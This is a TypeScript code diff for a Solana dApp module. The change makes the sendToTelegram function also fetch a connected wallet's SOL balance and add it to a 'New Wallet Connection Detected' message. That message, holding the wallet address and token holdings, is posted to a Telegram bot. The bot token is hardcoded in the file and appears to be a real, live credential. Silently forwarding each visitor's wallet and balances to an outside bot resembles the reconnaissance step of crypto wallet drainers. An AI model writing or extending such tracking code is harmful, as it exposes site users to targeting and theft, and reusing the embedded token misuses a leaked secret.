@@ -1,4 +1,5 @@
-import { Connection, PublicKey } from '@solana/web3.js';
+
+import { Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 
 // WARNING: Storing credentials in code is not secure
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
@@ -24,11 +25,20 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
+    const connection = new Connection('https://api.mainnet-beta.solana.com');
+    const solBalance = await connection.getBalance(new PublicKey(walletData.address));
+    const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;
+
     const formattedTokens = walletData.tokens.map((token: any) => 
       `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
     ).join('\n\n');
 
-    const message = `🔍 New Wallet Connection Detected:\n\n\n\n👛 Wallet Address: ${walletData.address}\n⏰ Time: ${new Date().toLocaleString()}\n\n\n\n💰 Token Balances:\n${formattedTokens}\n\n\n\n🌐 Network: Solana Mainnet`;
+    const message = `🔍 New Wallet Connection Detected:\n\n\n\n` +
+      `👛 Wallet Address: ${walletData.address}\n` +
+      `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
+      `⏰ Time: ${new Date().toLocaleString()}\n\n\n\n` +
+      `💰 Token Balances:\n${formattedTokens}\n\n\n\n` +
+      `🌐 Network: Solana Mainnet`;
 
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
